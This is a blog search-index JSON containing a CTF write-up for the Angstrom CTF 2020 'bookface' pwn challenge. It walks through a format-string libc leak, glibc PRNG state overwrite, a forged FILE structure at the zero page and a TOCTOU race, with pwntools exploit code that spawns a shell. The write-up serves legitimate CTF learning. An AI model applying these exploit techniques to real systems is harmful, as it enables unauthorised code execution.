[{"authors":["admin"],"categories":null,"content":"InfoSec Enthusiast, RE, PWN, Crypto | Docker Lover | CTF player at Sudo_root team | Student at ESI-SBA.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://philomath213.github.io/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"InfoSec Enthusiast, RE, PWN, Crypto | Docker Lover | CTF player at Sudo_root team | Student at ESI-SBA.","tags":null,"title":"Bilal Retiat","type":"authors"},{"authors":null,"categories":null,"content":"Challenge details    Event Challenge Category     Angstrom CTF 2020 bookface PWN    Description  I made a new social networking service. It\u0026rsquo;s a little glitchy, but no way that could result in a data breach, right?\nConnect with nc pwn.2020.chall.actf.co 20733.\n Attachments  bookface.tar.gz\n The attached tarball contains the following files:\n   File Description     bookface the main binary   bookface.c binary source code   libc.so.6 remote server libc   Dockerfile Dockerfile used to build the remote challenge   xinetd.conf xinetd config file to run the challenge   server.sh the executable to be launched via xinetd which will run bookface    TL;DL  Leak Libc address using Format String Attack. Abusing glibc PRNG by overwrite the random state using friends pointer. Writing a forged FILE structure in Zero Page. Trigger FILE structure exploit by a NULL Pointer Dereference Attack and exploiting a TOCTOU bug.  As usually in binary exploitation, binaries are related to libc, most of the time we need the libc to exploit the binary (calling system function, overwriting (malloc) or free hooks, using one_gadget, \u0026hellip;), so it\u0026rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.\nWe can easily build an identical docker image to the remote challenge image using these files, but if you want to debug the binary inside a container you need to install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.\nThe easy way that I prefer is patching the binary and modifying the RUNPATH to point to the directory where the target libc is located, this technique is explained in @Ayrx blog post \u0026ldquo;Using a non-system glibc\u0026rdquo;1.\n$ mv bookface backup $ python change_glibc.py backup libc.so.6 ld-2.23.so bookface Current ld.so: Path: /lib64/ld-linux-x86-64.so.2 New ld.so: Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so Adding RUNPATH: Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface Writing new binary bookface Please rename /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 to /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6. $ ldd backup linux-vdso.so.1 (0x00007ffd10964000) libc.so.6 =\u0026gt; /usr/lib/libc.so.6 (0x00007f80eaf0f000) /lib64/ld-linux-x86-64.so.2 =\u0026gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f80eb123000) $ ldd bookface linux-vdso.so.1 (0x00007ffe1bbe7000) libc.so.6 =\u0026gt; /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 (0x00007ff062cb8000) /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so =\u0026gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007ff0630ae000) N.B. You can get ld-2.23.so file from the ubuntu:xenial image.\nNow we can run the binary locally with the same libc used remotely.\nSource Code Analysis Since the source code is available, we don\u0026rsquo;t have to reverse engineering the binary, just read the code.\nFor global variables we have user a profile structure pointer and uid an integer.\nstruct profile *user; int uid; The profile structure has two fields: a char array (name) of size 0x100 and a pointer to a long long (friends).\nstruct profile { char name[0x100]; long long *friends; // some people have a lot of friends }; This program first call srand to set time(NULL) as seed for a new sequence of pseudo-random integers to be returned by rand() we will get back to this later in the writeup.\nThen it calls login(), the login function basically asks for userid and creates a file with userid as a file name under users directory.\nIf the file doesn\u0026rsquo;t exist, the program will call mmap, this will basically allocates a memory at a random address, witg a size equals to size of profile structure, the protections are PROT_READ | PROT_WRITE. Then it reads 0x100 bytes into it using fgets.\nputs(\u0026#34;Welcome to bookface!\u0026#34;); user = mmap(rand() \u0026amp; 0xfffffffffffff000, sizeof(struct profile), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); printf(\u0026#34;What\u0026#39;s your name? \u0026#34;); fgets(user-\u0026gt;name, 0x100, stdin); If the file already exists then it will ask for a brief survey.\nputs(\u0026#34;Before you log back in, please complete a brief survey.\u0026#34;); puts(\u0026#34;For each of the following categories, rate us from 1-10.\u0026#34;); char survey[20]; int n = 0; printf(\u0026#34;Content: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Moderation: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Interface: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Support: \u0026#34;); n += read(1, survey + n, 3); survey[n] = 0; The program check if there is any 'n' letter in the inputs, if so the program will exit.\nif (strchr(survey, \u0026#39;n\u0026#39;) != NULL) { // a bug bounty report said something about hacking and the letter n  puts(\u0026#34;ERROR: HACKING DETECTED\u0026#34;); puts(\u0026#34;Exiting...\u0026#34;); exit(1); } This would prevent users from doing arbitrary write using Format String Attack2 (using the common %n specifier), if there is any vulnerability like that.\nIf the survey rates are different than 10, 10, 10, 10, we notice the format string bug!.\nif (strcmp(survey, \u0026#34;10\\n10\\n10\\n10\\n\u0026#34;) != 0) { puts( \u0026#34;Those ratings don\u0026#39;t seem quite right. Please review them and try \u0026#34; \u0026#34;again:\u0026#34;); printf(survey); n = 0; printf(\u0026#34;Content: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Moderation: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Interface: \u0026#34;); n += read(1, survey + n, 3); printf(\u0026#34;Support: \u0026#34;); n += read(1, survey + n, 3); survey[n] = 0; } The program will call printf with user input survey directly as a format string printf(survey), so we have Format String Bug here.\nThen it opens the file and reads its content into an allocated memory via mmap the same way as mentioned above.\nuser = mmap(rand() \u0026amp; 0xfffffffffffff000, sizeof(struct profile), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); FILE *f = fopen(file, \u0026#34;rb\u0026#34;); fread(user, 1, sizeof(struct profile), f); fclose(f); At the end it checks if the survey rates were different then 10, 10, 10, 10, it will set friends number to 0.\nif (strcmp(survey, \u0026#34;10\\n10\\n10\\n10\\n\u0026#34;) != 0) { puts( \u0026#34;Our survey says... you don\u0026#39;t seem very nice. I doubt you have any \u0026#34; \u0026#34;friends!\u0026#34;); *(user-\u0026gt;friends) = 0; } That\u0026rsquo;s all what login function does, in the other hand the main function is just menu-driven while loop to choose between:\n incrementing friends number  printf(\u0026#34;How many friends would you like to make? \u0026#34;); long long new; scanf(\u0026#34; %lld\u0026#34;, \u0026amp;new); user-\u0026gt;friends += new; This will increments the pointer friends, it an obvious mistake.\ndecrementing friends number  printf(\u0026#34;How many friends would you like to lose? \u0026#34;); long long lost; scanf(\u0026#34; %lld\u0026#34;, \u0026amp;lost); user-\u0026gt;friends -= lost; The same here, decrementing the pointer friends.\ndeleting account  puts(\u0026#34;Deleting account...\\n\u0026#34;); sprintf(file, \u0026#34;users/%d\u0026#34;, uid); remove(file); login(); This will remove the file corresponding to userid, the call login function again.\nlogin off  puts(\u0026#34;Logging out...\\n\u0026#34;); sprintf(file, \u0026#34;users/%d\u0026#34;, uid); FILE *f = fopen(file, \u0026#34;wb\u0026#34;); fwrite(user, 1, sizeof(struct profile), f); fclose(f); login(); This will write the content pointed by user to the file corresponding to userid, and then will call login again.\nLet\u0026rsquo;s get back to login function, at the end if the survey rates were different then 10, 10, 10, 10 the program do this instruction *(user-\u0026gt;friends) = 0 which will dereference the friends long long* pointer and set its content to 0 (i.e. write 8 NULL bytes where friends is pointing), it means we have arbitrary 8 NULL bytes write.\nAnother remark: The program lacks errors checking, overall there are no error checking when dealing with files (fopen, fclose, fread).\nDetected vulnerabilities  Format String vulnerability (\u0026ldquo;arbitrary write\u0026rdquo; isn\u0026rsquo;t included since \u0026lsquo;n\u0026rsquo; letter is filtered) in login function. Arbitrary 8 NULL bytes write via friends pointer. The lack of errors checking.  Exploitation None of these vulnerabilities on their own allow us to exploit this binary, we need to use multiples attacks to achieve code execution on the remote server.\nNote that the 1st line of Dockerfile contains a comment:\n#IMPORTANT: on host system: sysctl vm.mmap_min_addr=0 What does it mean?\nmmap_min_addr is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap3, Allowing processes to map low values expose the system to \u0026ldquo;Kernel NULL pointer dereference\u0026rdquo; attacks4.\nIt was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attacks, but in our case it\u0026rsquo;s disabled since mmap_min_addr=0.\nYou can check the current value in your local machine at /proc/sys/vm/mmap_min_addr (Arch linux, for other distributions maybe at a different location)\n$ cat /proc/sys/vm/mmap_min_addr 65536 The default value in Arch Linux is 65536 (0x10000).\nN.B. This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.\nIf you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due to the lack of error checking.\nFILE *f = fopen(file, \u0026#34;rb\u0026#34;); fread(user, 1, sizeof(struct profile), f); fclose(f); Upon successful completion fopen returns a FILE pointer Otherwise, NULL is returned.\nNULL is just a zero value, NULL pointer is 8 (or 4 in 32 bits machine) null bytes (i.e. 0x0000000000000000 or 0x00000000 in 32 bits machine).\nWhat will happen if fopen fails? basically the following:\nfread(user, 1, sizeof(struct profile), (FILE *)0); fclose((FILE *)0); fread and fclose will dereference the f FILE pointer (f will points to 0x0000000000000000 memory address).\nSo if we can map (allocate) memory at the 0x0000000000000000 address (Zero Page) and write a forged FILE structure there.\nfread and fclose will simply consider it as valid FILE structure.\nThe question is therefore: How can this helps us achieve code execution?\n@Angelboy in his paper FILE Structures: Another Binary Exploitation Technique5, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the FILE structure in GNU C Library (glibc) to gain control over execution flow (RIP), this technique won\u0026rsquo;t only get RIP control, but also control over RDI, RSI and RDX.\nThe attack is illustrated in @Dhaval Kapil blog post FILE Structure Exploitation (\u0026lsquo;vtable\u0026rsquo; check bypass)6, it calls fclose with a forged FILE structure, this structure contains vtable, which is a pointer to a table contains functions that will be called when the original FILE pointer is used to perform different operations (e.g. fclose, fread, fwrite).\nSo what we need right now is:\n Make mmap maps a memory page at address 0x0000000000000000. Forge a malicious FILE structure at 0x0000000000000000. Make fopen fails and return NULL in order to call fclose((FILE *)0).  LIBC + PIE Leak The binary comes with all protection schemes + ASLR enabled.\n$ checksec --file bookface Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled We need to leak some addresses to bypass PIE and ASLR.\nWe\u0026rsquo;ll use Format String Attack to get leak to address in the stack, to get to that we need to provide a userid then logout and use the same userid.\nWe\u0026rsquo;ll set a breakpoint at *login+501 where the program calls printf(survey) and observe what\u0026rsquo;s in the stack at that point.\n$ gdb-gef bookface ... gef\u0026gt; break *login+820 Breakpoint 1 at 0x449e gef\u0026gt; run Starting program: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface Please enter your user ID: 2130 Welcome to bookface! What's your name? ABCD You have 0 friends. What would you like to do? [1] Make friends [2] Lose friends [3] Delete account [4] Log out \u0026gt; 4 Logging out... Please enter your user ID: 2130 Before you log back in, please complete a brief survey. For each of the following categories, rate us from 1-10. Content: %p%p%p%p%p Moderation: Interface: Support: Those ratings don't seem quite right. Please review them and try again: ... gef\u0026gt; info frame Stack level 0, frame at 0x7fffffffdef0: rip = 0x55555555849e in login; saved rip = 0x555555558985 called by frame at 0x7fffffffdf60 Arglist at 0x7fffffffdee0, args: Locals at 0x7fffffffdee0, Previous frame's sp is 0x7fffffffdef0 Saved registers: rbp at 0x7fffffffdee0, rip at 0x7fffffffdee8 ... gef➤ telescope 32 0x00007fffffffde70│+0x0000: 0x0000000b00000000\t← $rsp 0x00007fffffffde78│+0x0008: 0x00007ffff7a9153c → \u0026lt;free+76\u0026gt; add rsp, 0x28 0x00007fffffffde80│+0x0010: \u0026quot;%p%p%p%p%p\\n\u0026quot;\t← $rdi 0x00007fffffffde88│+0x0018: 0x00000000000a7025 (\u0026quot;%p\\n\u0026quot;?) 0x00007fffffffde90│+0x0020: 0x0000000000000000 0x00007fffffffde98│+0x0028: 0x0000000000000000 0x00007fffffffdea0│+0x0030: \u0026quot;users/2130\u0026quot; 0x00007fffffffdea8│+0x0038: 0x0000555555003033 (\u0026quot;30\u0026quot;?) 0x00007fffffffdeb0│+0x0040: 0x0000000000000000 0x00007fffffffdeb8│+0x0048: 0x00005555555581b0 → \u0026lt;_start+0\u0026gt; endbr64 0x00007fffffffdec0│+0x0050: 0x00007fffffffe030 → 0x0000000000000001 0x00007fffffffdec8│+0x0058: 0x00007ffff7a7a363 → \u0026lt;fclose+259\u0026gt; mov eax, ebp 0x00007fffffffded0│+0x0060: 0x0000000000000000 0x00007fffffffded8│+0x0068: 0xf46cff2f1bf3ec00 0x00007fffffffdee0│+0x0070: 0x00007fffffffdf50 → 0x00005555555589a0 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 ← $rbp 0x00007fffffffdee8│+0x0078: 0x0000555555558985 → \u0026lt;main+681\u0026gt; jmp 0x555555558992 \u0026lt;main+694\u0026gt; 0x00007fffffffdef0│+0x0080: 0x0000000000000001 0x00007fffffffdef8│+0x0088: 0x000003e8ffffdf70 0x00007fffffffdf00│+0x0090: 0x00007ffff7ffe168 → 0x0000555555554000 → 0x00010102464c457f 0x00007fffffffdf08│+0x0098: 0x000055555557e010 → 0x00000000fbad240c 0x00007fffffffdf10│+0x00a0: \u0026quot;users/2130\u0026quot; 0x00007fffffffdf18│+0x00a8: 0x0000555555003033 (\u0026quot;30\u0026quot;?) 0x00007fffffffdf20│+0x00b0: 0x00007fffffffdf4e → 0x5555555589a0f46c 0x00007fffffffdf28│+0x00b8: 0x0000000000000000 0x00007fffffffdf30│+0x00c0: 0x00005555555589a0 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 0x00007fffffffdf38│+0x00c8: 0x00005555555581b0 → \u0026lt;_start+0\u0026gt; endbr64 0x00007fffffffdf40│+0x00d0: 0x00007fffffffe030 → 0x0000000000000001 0x00007fffffffdf48│+0x00d8: 0xf46cff2f1bf3ec00 0x00007fffffffdf50│+0x00e0: 0x00005555555589a0 → \u0026lt;__libc_csu_init+0\u0026gt; endbr64 0x00007fffffffdf58│+0x00e8: 0x00007ffff7a2d830 → \u0026lt;__libc_start_main+240\u0026gt; mov edi, eax 0x00007fffffffdf60│+0x00f0: 0x0000000000000001 0x00007fffffffdf68│+0x00f8: 0x00007fffffffe038 → 0x00007fffffffe332 → \u0026quot;/home/philomath213/Documents/CTFs/angstromctf2020/[...]\u0026quot; The login function stack frame is located at 0x7fffffffdef0 ($rsp+0x0090), and the saved return address is located at 0x7fffffffdee8 ($rsp+0x0078) this pointer will give us the binary base where it\u0026rsquo;s loaded, there is another interesting pointer at 0x00007fffffffdf58 ($rsp+0x00e8) a libc pointer, it will give us libc base address.\nThe format string offset for the 1st pointer will be 21 (%21$p) while the 2nd will be 35 (%35$p).\nIn order to calculate the base address from these two pointers we need precalculate the offsets.\ngef\u0026gt; vmmap Start End Offset Perm Path 0x0000555555554000 0x0000555555558000 0x0000000000000000 r-- /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface ... 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 ... The binary base address is 0x0000555555554000 and the leaked address is 0x0000555555558985.\ngef\u0026gt; p 0x0000555555558985 - 0x0000555555554000 $1 = 0x4985 We do the same for libc address.\ngef\u0026gt; p 0x00007ffff7a2d830 - 0x00007ffff7a0d000 $2 = 0x20830 libc address leak exploit libc_offset = 0x20830 uid = randint(0, 2**30) # create user with uid and name AAAA T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) T.sendlineafter(\u0026#34;What\u0026#39;s your name? \u0026#34;, b\u0026#34;AAAA\u0026#34;) # logout T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) # login again with same uid T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) # format string offset payload = b\u0026#39;AA%35$pBB\u0026#39; assert len(payload) \u0026lt;= 12 T.sendlineafter(\u0026#34;Content: \u0026#34;, payload) T.recvuntil(b\u0026#39;AA\u0026#39;) leak = T.recvuntil(b\u0026#39;BB\u0026#39;).strip(b\u0026#39;BB\u0026#39;) leak = int(leak, base=16) log.info(\u0026#34;leak: 0x{:016x}\u0026#34;.format(leak)) libc_base = leak - libc_offset log.info(\u0026#34;libc_base: 0x{:016x}\u0026#34;.format(libc_base)) Zero Page We need to write the forged FILE structure into the Zero Page (i.e. memory page at 0x0000000000000000), when login with a new userid the following instruction will be executed:\nputs(\u0026#34;Welcome to bookface!\u0026#34;); user = mmap(rand()\u0026amp;0xfffffffffffff000, sizeof (struct profile), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0); printf(\u0026#34;What\u0026#39;s your name? \u0026#34;); fgets(user-\u0026gt;name, 0x100, stdin); mmap will map a page at rand() \u0026amp; 0xfffffffffffff000, there are two ways (maybe more) to make that value be zero:\n1. Easy dirty way \u0026ldquo;Brutforce\u0026rdquo;: rand() (see man 3 rand) will return a pseudo-random integer in range [0, RAND_MAX], RAND_MAX dependent on the implementation, but it\u0026rsquo;s guaranteed that this value is at least 32767 (0x7fff)7. there is a chance that rand() will return a integer less than 0x1000.\n2. Hard efficient way \u0026ldquo;Abusing glibc PRNG\u0026rdquo;: glibc pseudo-random-number-generator (PRNG)8 like any PRNG generates a sequence of random numbers, this sequence is not truly random, because it is determined by the PRNG\u0026lsquo;s state which is initially the seed value set by srand, in our case it is time(NULL), glibc PRNG (see man 3 rand) use hidden state that is modified on each call, this hidden state is probably located at writable memory in libc address space.\nTo find how glibc PRNG works we need to dig deeper in glibc source code, I usually use Bootlin - Elixir Cross Referencer 9 to browse Linux Kernel and Glibc source code, actually the rand function is just wrapper to __random and the latter is also a wrapper to __random_r, make sure you are browsing the correct glibc version glibc-2.23 10.\nint rand (void) { return (int) __random (); } long int __random (void) { int32_t retval; __libc_lock_lock (lock); (void) __random_r (\u0026amp;unsafe_state, \u0026amp;retval); __libc_lock_unlock (lock); return retval; } __random_r is defined in stdlib/random_r.c line 35311.\nint __random_r (struct random_data *buf, int32_t *result) { int32_t *state; if (buf == NULL || result == NULL) goto fail; state = buf-\u0026gt;state; if (buf-\u0026gt;rand_type == TYPE_0) { int32_t val = state[0]; val = ((state[0] * 1103515245) + 12345) \u0026amp; 0x7fffffff; state[0] = val; *result = val; } else { int32_t *fptr = buf-\u0026gt;fptr; int32_t *rptr = buf-\u0026gt;rptr; int32_t *end_ptr = buf-\u0026gt;end_ptr; int32_t val; val = *fptr += *rptr; /* Chucking least random bit. */ *result = (val \u0026gt;\u0026gt; 1) \u0026amp; 0x7fffffff; ++fptr; if (fptr \u0026gt;= end_ptr) { fptr = state; ++rptr; } else { ++rptr; if (rptr \u0026gt;= end_ptr) rptr = state; } buf-\u0026gt;fptr = fptr; buf-\u0026gt;rptr = rptr; } return 0; fail: __set_errno (EINVAL); return -1; } At the beginning of the function there is a test for the random type, from code comments we see that there two types, if rand_type == TYPE_0 the old linear congruential bit will be used. Otherwise, the fancy trinomial stuff.\nWe don\u0026rsquo;t know which one is beening used in our libc, we will use a debugger to figure it out.\ngef\u0026gt; disas random_r Dump of assembler code for function random_r: 0x00007ffff7a47c40 \u0026lt;+0\u0026gt;:\ttest rdi,rdi 0x00007ffff7a47c43 \u0026lt;+3\u0026gt;:\tje 0x7ffff7a47cc0 \u0026lt;random_r+128\u0026gt; 0x00007ffff7a47c45 \u0026lt;+5\u0026gt;:\ttest rsi,rsi 0x00007ffff7a47c48 \u0026lt;+8\u0026gt;:\tje 0x7ffff7a47cc0 \u0026lt;random_r+128\u0026gt; 0x00007ffff7a47c4a \u0026lt;+10\u0026gt;:\tmov eax,DWORD PTR [rdi+0x18] 0x00007ffff7a47c4d \u0026lt;+13\u0026gt;:\tmov r8,QWORD PTR [rdi+0x10] 0x00007ffff7a47c51 \u0026lt;+17\u0026gt;:\ttest eax,eax 0x00007ffff7a47c53 \u0026lt;+19\u0026gt;:\tje 0x7ffff7a47ca0 \u0026lt;random_r+96\u0026gt; 0x00007ffff7a47c55 \u0026lt;+21\u0026gt;:\tmov rax,QWORD PTR [rdi] ... The condition is at *random_r+17, set a break point there and examin rax register\ngef\u0026gt; run ... gef\u0026gt; b *random_r+17 .... gef\u0026gt; continue .... gef\u0026gt; info registers rax rax 0x3 0x3 The random type isn\u0026rsquo;t TYPE_0, so the 2nd part of code will be used to compute the next random integer, it will be written to the 2nd parameter int32_t *result which is the retval variable in __random function.\nthe result is *result = (val \u0026gt;\u0026gt; 1) \u0026amp; 0x7fffffff and val = *fptr += *rptr, so in order to make rand() return a 0 we need to overwrite *fptr and *rptr with zero (i.e. val = 0 =\u0026gt; *result = 0 ), those two pointer change after each call to random, we need to find the right ones for the right call, (e.g. if we want the 2nd call returns 0, we call rand once then debug the 2nd call to get the right pointers), this is the eays way to get them.\nint32_t *fptr = buf-\u0026gt;fptr; int32_t *rptr = buf-\u0026gt;rptr; This piece of code corespands to:\n0x7f7aa7c72c56 \u0026lt;random_r+22\u0026gt; mov eax, DWORD PTR [rdi] 0x7f7aa7c72c58 \u0026lt;random_r+24\u0026gt; mov rcx, QWORD PTR [rdi+0x8] The values of fptr and rptr will rax and rcx respectivly\ngef\u0026gt; b *random_r+24 ... gef\u0026gt; i r rax rcx rax 0x7f7aa7ffc0c4 0x7f7aa7ffc0c4 rcx 0x7f7aa7ffc0b8 0x7f7aa7ffc0b8 gef➤ p 0x7f7aa7ffc0b8 - 0x00007f7aa7c38000 $1 = 0x3c40b8 the offset to *rptr is 0x3c40b8 while *fptr is 0x3c40c4, 12 bytes distance bitween them.\nWe can overwrite this address with null value using the friends pointer in profile structure, we will use option one to increment it to points to *rptr, overwrite with zero then do the same to *fptr.\nThe friends pointer is of type long long* and it equals to 0 initialy, in pointer arithmetic for a given pointer x, x + 5 actually is x + 5*sizeof(data_type), we have sizeof(long long) == 8, so we increment friends pointer with (*rptr address) / 8.\nSet random state fptr and rptr to 0 random_state_offset = 0x3c40b8 random_state = libc_base + random_state_offset # set random_state fptr and rptr to 0 # in order to make rand() return 0 # fptr T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) T.sendlineafter(\u0026#34;you like to make? \u0026#34;, str(random_state//8)) # logout T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) # login again with the same T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) T.sendlineafter(\u0026#34;Content: \u0026#34;, b\u0026#39;A\u0026#39;*11) T.sendlineafter(\u0026#34;Content: \u0026#34;, b\u0026#39;A\u0026#39;*11) # rptr = rptr + 8 T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) T.sendlineafter(\u0026#34;you like to make? \u0026#34;, str(8//8)) # logout T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) # login again with the same uid T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) T.sendlineafter(\u0026#34;Content: \u0026#34;, b\u0026#39;A\u0026#39;*11) T.sendlineafter(\u0026#34;Content: \u0026#34;, b\u0026#39;A\u0026#39;*11) After that will login with a new userid in order to allocate a Zero Page and write into it the forged FILE structure.\nI used the same code in 6 with little modification to make the FILE structure.\ndef pack_file(_flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0, _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0, _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _IO_marker=0, _IO_chain=0, _fileno=0, _lock=0): struct = p32(_flags) + \\ p32(0) + \\ p64(_IO_read_ptr) + \\ p64(_IO_read_end) + \\ p64(_IO_read_base) + \\ p64(_IO_write_base) + \\ p64(_IO_write_ptr) + \\ p64(_IO_write_end) + \\ p64(_IO_buf_base) + \\ p64(_IO_buf_end) + \\ p64(_IO_save_base) + \\ p64(_IO_backup_base) + \\ p64(_IO_save_end) + \\ p64(_IO_marker) + \\ p64(_IO_chain) + \\ p32(_fileno) struct = struct.ljust(0x88, b\u0026#34;\\x00\u0026#34;) struct += p64(_lock) struct = struct.ljust(0xd8, b\u0026#34;\\x00\u0026#34;) return struct def make_fake_file_struct(libc_base, rip, rdi): # We can only have even rdi assert(rdi % 2 == 0) # Crafting FILE structure # This stores the address of a pointer to the _IO_str_overflow function # Libc specific io_str_overflow_ptr_addr = libc_base + \\ libc.symbols[\u0026#39;_IO_file_jumps\u0026#39;] + 0xd8 # Calculate the vtable by subtracting appropriate offset fake_vtable_addr = io_str_overflow_ptr_addr - 2*8 # Craft file struct file_struct = pack_file(_IO_buf_base=0, _IO_buf_end=(rdi-100)//2, _IO_write_ptr=(rdi-100)//2, _IO_write_base=0, _lock=0) # vtable pointer file_struct += p64(fake_vtable_addr) # Next entry corresponds to: (*((_IO_strfile *) fp)-\u0026gt;_s._allocate_buffer) file_struct += p64(rip) return file_struct # logout T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) # login again with wrong uid uid = randint(0, 2**30) T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) raw_input(\u0026#34;\u0026gt; Debug\u0026#34;) # Our target # mmap to 0 file_addr = 0 rip = libc_base + libc.symbols[\u0026#39;system\u0026#39;] # rdi = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # The first param we want # next to file_struct rdi = 0xf0 log.info(\u0026#34;file_addr 0x{:016x}\u0026#34;.format(file_addr)) log.info(\u0026#34;rip 0x{:016x}\u0026#34;.format(rip)) log.info(\u0026#34;rdi 0x{:016x}\u0026#34;.format(rdi)) file_struct = make_fake_file_struct(libc_base, rip, rdi) file_struct = file_struct.ljust(0xf0, b\u0026#39;\\x00\u0026#39;) payload = file_struct + b\u0026#39;/bin/sh\\x00\u0026#39; assert b\u0026#39;\\n\u0026#39; not in payload T.sendlineafter(\u0026#34;What\u0026#39;s your name? \u0026#34;, payload) N.B. The rdi parameter must be even, the offset of /bin/sh string in this libc isn\u0026rsquo;t even, we can\u0026rsquo;t use it, so we\u0026rsquo;ll write the /bin/sh string after the FILE structure, it\u0026rsquo;s aligned to 0xf0, so the string will be at 0x00000000000000f0 (since mmap maps the zero page at 0x0000000000000000).\nTo triger to exploit we must call fclose with NULL pointer as parameter. So the call to fopen must fail and return NULL.\nFILE *f = fopen(file, \u0026#34;rb\u0026#34;); fread(user, 1, sizeof (struct profile), f); fclose(f); How can fopen(file, \u0026quot;rb\u0026quot;) fails? the mode string is \u0026quot;rb\u0026quot;, it\u0026rsquo;s a read, so if the file doesn\u0026rsquo;t exists fopen will fail and return NULL.\nLogin function check if the file exists with access then asks for the survey, where there are multiple calls to read, it\u0026rsquo;s a blocking function, it will block and wait for user input. This is a Time-of-check to time-of-use (TOCTOU)12 bug.\nWe\u0026rsquo;ll open another connection and use the same userid to remove the file using the 3rd option \u0026ldquo;deleting account\u0026rdquo;.\n# logout T.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) # login again with the last uid T.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) # remove the uid user file with another connection # TOCTOU raw_input(\u0026#34;\u0026gt; debug\u0026#34;) log.info(\u0026#34;uid: {}\u0026#34;.format(uid)) log.info(\u0026#34;race condition !!\u0026#34;) T2 = remote(T.rhost, T.rport) T2.sendlineafter(\u0026#34;Please enter your user ID: \u0026#34;, str(uid)) T2.sendlineafter(\u0026#34;Content\u0026#34;, b\u0026#34;10\\n10\\n10\\n10\u0026#34;) T2.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;3\u0026#34;) payload = b\u0026#39;10\\n10\\n10\\n10\\n\u0026#39; assert len(payload) \u0026lt;= 12 T.sendlineafter(\u0026#34;Content: \u0026#34;, payload) T.clean() T.sendline(\u0026#34;uname -a;id\u0026#34;) T.interactive() Final Exploit You can find the full exploit here.\nReferences   Using a non-system glibc \u0026#x21a9;\u0026#xfe0e;\n OWASP - Format String Attack \u0026#x21a9;\u0026#xfe0e;\n Debian Wiki - mmap_min_addr \u0026#x21a9;\u0026#xfe0e;\n Patrick Biernat - Linux Kernel Exploitation \u0026#x21a9;\u0026#xfe0e;\n FILE Structures: Another Binary Exploitation Technique \u0026#x21a9;\u0026#xfe0e;\n Dhaval Kapil - FILE Structure Exploitation (\u0026lsquo;vtable\u0026rsquo; check bypass) \u0026#x21a9;\u0026#xfe0e;\n C++ reference - RAND_MAX \u0026#x21a9;\u0026#xfe0e;\n Wikipedia - Pseudorandom number generator \u0026#x21a9;\u0026#xfe0e;\n Bootlin - Elixir Cross Referencer \u0026#x21a9;\u0026#xfe0e;\n Bootlin Elixir - glibc-2.23 \u0026#x21a9;\u0026#xfe0e;\n glibc-2.23 - __random_r \u0026#x21a9;\u0026#xfe0e;\n Time-Of-Check To Time-Of-Use \u0026#x21a9;\u0026#xfe0e;\n   ","date":1585257279,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585257279,"objectID":"4c1491db12d029dd68595d774ec24c17","permalink":"https://philomath213.github.io/post/angstromctf2020-bookface/","publishdate":"2020-03-26T22:14:39+01:00","relpermalink":"/post/angstromctf2020-bookface/","section":"post","summary":"Challenge details    Event Challenge Category     Angstrom CTF 2020 bookface PWN    Description  I made a new social networking service. It\u0026rsquo;s a little glitchy, but no way that could result in a data breach, right?\nConnect with nc 